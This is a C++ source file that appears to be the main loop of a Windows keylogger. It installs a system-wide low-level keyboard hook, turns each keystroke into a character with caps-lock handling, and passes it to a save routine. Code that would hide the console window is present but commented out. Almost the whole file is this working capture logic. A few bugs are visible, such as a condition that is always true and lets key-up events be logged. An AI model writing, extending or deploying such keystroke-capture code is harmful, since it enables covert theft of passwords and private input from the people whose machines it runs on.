#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <bits/stdc++.h>
#include <conio.h>
#include "mainloop.h"
#include "key_save.h"
#include "transSpecialKey.h"

int save(char kbdChar, bool capsLock){

    switch(capsLock){
        case true:
            std::cout << "char : " << kbdChar << std::endl;
            saveData(std::string(1, std::toupper(kbdChar)));
            break;
        case false:
            std::cout << "char : " << kbdChar << std::endl;
            saveData(std::string(1, std::tolower(kbdChar)));
            break;
    }

    return 0;
}

int savePKey(std::string specialKey){
    std::cout << "char : " << specialKey << std::endl;
    saveData(specialKey);

    return 0;
}

char cnvToChar(int vkCode){
    char kbdChar;
    kbdChar = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
    return kbdChar;
}

LRESULT CALLBACK KBHook(int nCode, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT *KBDLLStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);   

    if(WM_KEYDOWN){
        int vkCode = KBDLLStruct->vkCode;
        
        if(GetKeyState(VK_CAPITAL)){
            //CAPSLOCK is ON
            std::cout << "CAPSLOCK is ON" << std::endl;
            bool capsLock = true;
            char kbdChar = cnvToChar(vkCode);
            save(kbdChar, capsLock);
        } else {
            std::cout << "CAPSLOCK is OFF" << std::endl;
            //CAPSLOCK is OFF
            bool capsLock = false;
            char kbdChar = cnvToChar(vkCode);
            save(kbdChar, capsLock);
            
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void MainLoop::run(){

    //HWND hwnd = GetConsoleWindow();
    //ShowWindow(hwnd, SW_HIDE);

    std::cout << "Hello World!" << std::endl;

    HHOOK kbd = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        &KBHook,
        0,
        0
    );

    MSG message;
    while(GetMessage(&message, NULL, 0, 0)){
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(kbd);
}